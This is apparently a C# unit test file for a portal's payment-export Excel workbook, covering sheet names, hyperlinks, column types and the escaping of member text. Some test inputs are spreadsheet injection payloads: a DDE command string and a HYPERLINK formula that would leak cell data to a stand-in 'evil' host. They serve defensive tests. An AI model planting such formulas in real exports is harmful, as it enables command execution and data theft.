using ClosedXML.Excel;
using PSMPE.Portal.Application.Payments.Export;
using Xunit;

namespace PSMPE.Portal.Application.UnitTests.Payments;

public class PaymentExportWorkbookTests
{
    private static PaymentExportRow Row(
        string fullName = "Juan Dela Cruz", string? mobile = "09170000001", ProofPicture? picture = null, string? note = "No proof on file", string reference = "REF-1") =>
        new(fullName, "juan@example.com", "12 Sample St., Sample City", mobile, 1700m, reference,
            new DateOnly(2026, 8, 29), picture, note, "New membership");

    private static XLWorkbook OpenWorkbook(params PaymentExportRow[] rows) =>
        new(new MemoryStream(PaymentExportWorkbook.Build(rows)));

    [Fact]
    public void Build_AddsOneSheetPerPaymentAfterTheList()
    {
        var workbook = OpenWorkbook(Row(fullName: "Ana Reyes"), Row(fullName: "Ben Cruz"));

        Assert.Equal(
            ["Awaiting Verification", "1 Ana Reyes", "2 Ben Cruz"],
            workbook.Worksheets.OrderBy(s => s.Position).Select(s => s.Name));
    }

    [Fact]
    public void Build_EmptyQueueHasOnlyTheList()
    {
        Assert.Single(OpenWorkbook().Worksheets);
    }

    [Fact]
    public void Build_SameMemberTwiceGetsTwoSheets()
    {
        Assert.Equal(3, OpenWorkbook(Row(), Row()).Worksheets.Count);
    }

    [Theory]
    [InlineData("=cmd|'/c calc'!A1", "1 cmdc calcA1")]
    [InlineData("O'Brien [Jr]: a/b\\c*d?", "1 OBrien Jr abcd")]
    [InlineData("???", "1")]
    [InlineData("José Ñ. Dela-Cruz", "1 José Ñ. Dela-Cruz")]
    public void Build_KeepsOnlySafeCharactersInSheetNames(string fullName, string expected)
    {
        var workbook = OpenWorkbook(Row(fullName: fullName));

        Assert.Equal(expected, workbook.Worksheets.Single(s => s.Position == 2).Name);
    }

    [Fact]
    public void Build_TruncatesLongNamesToExcelsSheetNameLimit()
    {
        var workbook = OpenWorkbook(Row(fullName: new string('A', 60) + " 😀"));

        Assert.Equal("1 " + new string('A', 29), workbook.Worksheets.Single(s => s.Position == 2).Name);
    }

    [Fact]
    public void Build_RecordSheetShowsEachDetail()
    {
        var sheet = OpenWorkbook(Row()).Worksheet("1 Juan Dela Cruz");

        var details = Enumerable.Range(3, 8).ToDictionary(r => sheet.Cell(r, 1).GetString(), r => sheet.Cell(r, 2));
        Assert.Equal("Juan Dela Cruz", details["Full Name"].GetString());
        Assert.Equal("juan@example.com", details["Email"].GetString());
        Assert.Equal("12 Sample St., Sample City", details["Address"].GetString());
        Assert.Equal("09170000001", details["CP Number"].GetString());
        Assert.Equal(1700d, details["Amount"].GetDouble());
        Assert.Contains("₱", details["Amount"].Style.NumberFormat.Format);
        Assert.Equal("REF-1", details["Reference"].GetString());
        Assert.Equal(new DateTime(2026, 8, 29), details["Paid On"].GetDateTime());
        Assert.Equal("New membership", details["For"].GetString());
    }

    [Fact]
    public void Build_RecordSheetNeverTurnsMemberTextIntoAFormula()
    {
        var sheet = OpenWorkbook(Row(reference: "=1+1")).Worksheet("1 Juan Dela Cruz");

        var reference = Enumerable.Range(3, 8).Select(r => sheet.Cell(r, 2)).Single(c => c.GetString().Contains("=1+1"));
        Assert.False(reference.HasFormula);
        Assert.Equal("'=1+1", reference.GetString());
    }

    [Fact]
    public void Build_RecordSheetShowsTheProofAtFullSize()
    {
        var picture = new ProofPicture(ProofFixtures.Jpeg(1000, 500), 1000, 500);

        var sheet = OpenWorkbook(Row(picture: picture, note: null)).Worksheet("1 Juan Dela Cruz");

        var embedded = Assert.Single(sheet.Pictures);
        Assert.Equal(1000, embedded.Width);
        Assert.Equal(500, embedded.Height);
    }

    [Fact]
    public void Build_RecordSheetShowsTheNoteWhenThereIsNoPicture()
    {
        var sheet = OpenWorkbook(Row(note: "File missing")).Worksheet("1 Juan Dela Cruz");

        Assert.Empty(sheet.Pictures);
        Assert.Contains(sheet.CellsUsed(), c => c.GetString() == "File missing");
    }

    [Fact]
    public void Build_ListLinksToTheProofInsteadOfEmbeddingIt()
    {
        var picture = new ProofPicture(ProofFixtures.Jpeg(800, 400), 800, 400);

        var workbook = OpenWorkbook(Row(fullName: "Ana Reyes"), Row(fullName: "Ben Cruz", picture: picture, note: null));

        var list = workbook.Worksheet("Awaiting Verification");
        var link = list.Cell(3, 8);
        Assert.Empty(list.Pictures);
        Assert.Equal("Proof link", link.GetString());
        Assert.False(link.GetHyperlink().IsExternal);
        Assert.Equal("'2 Ben Cruz'!A1", link.GetHyperlink().InternalAddress);
    }

    [Fact]
    public void Build_ListShowsTheNoteWithoutALinkWhenThereIsNoPicture()
    {
        var cell = Open(Row()).Cell(2, 8);

        Assert.Equal("No proof on file", cell.GetString());
        Assert.False(cell.HasHyperlink);
    }

    [Fact]
    public void Build_ListAndRecordSheetLinkToEachOther()
    {
        var workbook = OpenWorkbook(Row(fullName: "Ana Reyes"), Row(fullName: "Ben Cruz"));

        var toRecord = workbook.Worksheet("Awaiting Verification").Cell(3, 1).GetHyperlink();
        var back = workbook.Worksheet("2 Ben Cruz").Cell(1, 1).GetHyperlink();

        Assert.False(toRecord.IsExternal);
        Assert.Equal("'2 Ben Cruz'!A1", toRecord.InternalAddress);
        Assert.False(back.IsExternal);
        Assert.Equal("'Awaiting Verification'!A3", back.InternalAddress);
    }

    private static IXLWorksheet Open(params PaymentExportRow[] rows) =>
        new XLWorkbook(new MemoryStream(PaymentExportWorkbook.Build(rows))).Worksheet("Awaiting Verification");

    [Fact]
    public void Build_WritesHeadersInTheAgreedOrderAndFreezesThem()
    {
        var sheet = Open();

        var headers = Enumerable.Range(1, 9).Select(c => sheet.Cell(1, c).GetString());
        Assert.Equal(
            ["Full Name", "Email", "Address", "CP Number", "Amount", "Reference", "Paid On", "Proof of Payment", "For"],
            headers);
        Assert.Equal(1, sheet.SheetView.SplitRow);
    }

    [Fact]
    public void Build_WritesEachValueToItsColumnWithTheRightType()
    {
        var sheet = Open(Row());

        Assert.Equal("Juan Dela Cruz", sheet.Cell(2, 1).GetString());
        Assert.Equal("juan@example.com", sheet.Cell(2, 2).GetString());
        Assert.Equal("12 Sample St., Sample City", sheet.Cell(2, 3).GetString());
        Assert.Equal(XLDataType.Number, sheet.Cell(2, 5).DataType);
        Assert.Equal(1700d, sheet.Cell(2, 5).GetDouble());
        Assert.Equal("REF-1", sheet.Cell(2, 6).GetString());
        Assert.Equal(XLDataType.DateTime, sheet.Cell(2, 7).DataType);
        Assert.Equal(new DateTime(2026, 8, 29), sheet.Cell(2, 7).GetDateTime());
        Assert.Equal("New membership", sheet.Cell(2, 9).GetString());
        Assert.Contains("₱", sheet.Cell(2, 5).Style.NumberFormat.Format);
        Assert.Equal("mm/dd/yyyy", sheet.Cell(2, 7).Style.NumberFormat.Format);
    }

    [Theory]
    [InlineData("09170000001")]
    [InlineData("+639170000001")]
    public void Build_KeepsMobileNumbersAsText(string mobile)
    {
        var cell = Open(Row(mobile: mobile)).Cell(2, 4);

        Assert.Equal(XLDataType.Text, cell.DataType);
        Assert.Equal(mobile, cell.GetString());
    }

    [Theory]
    [InlineData("=1+1", "'=1+1")]
    [InlineData("+1+1", "'+1+1")]
    [InlineData("-1+1", "'-1+1")]
    [InlineData("@SUM(A1)", "'@SUM(A1)")]
    [InlineData("'=1+1", "'=1+1")]
    [InlineData("'Tis", "'Tis")]
    [InlineData(" =1+1", "' =1+1")]
    public void Build_NeverTurnsMemberTextIntoAFormula(string value, string expected)
    {
        var cell = Open(Row(fullName: value)).Cell(2, 1);

        Assert.False(cell.HasFormula);
        Assert.Equal(expected, cell.GetString());
    }

    [Fact]
    public void Build_NeutralisesFormulasInTheReferenceColumn()
    {
        const string evil = "=HYPERLINK(\"http://evil.example/?\"&A3,\"Open\")";

        var cell = Open(Row(reference: evil)).Cell(2, 6);

        Assert.False(cell.HasFormula);
        Assert.Equal("'" + evil, cell.GetString());
    }

    [Fact]
    public void Build_LeavesASingleCharacterReferenceAlone()
    {
        Assert.Equal("-", Open(Row(reference: "-")).Cell(2, 6).GetString());
    }
}
